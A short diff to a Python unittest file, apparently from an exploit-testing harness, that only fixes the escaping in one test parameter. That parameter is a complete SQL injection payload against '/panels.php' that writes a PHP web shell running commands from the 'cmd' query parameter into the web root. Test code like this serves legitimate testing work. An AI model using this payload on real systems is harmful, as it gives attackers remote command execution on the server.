@@ -10,7 +10,7 @@ class TestPyre(unittest.TestCase):
             target_ip=self.pyre_target_ip,
             url_path="/panels.php",
             params={
-                "id": "-1 UNION SELECT 1,2,3,4,5,6,7,'<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/tester.php' -- -"
+                "id": "-1 UNION SELECT 1,2,3,4,5,6,7,'<?php system(\\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/tester.php' -- -"
             }
         )
 
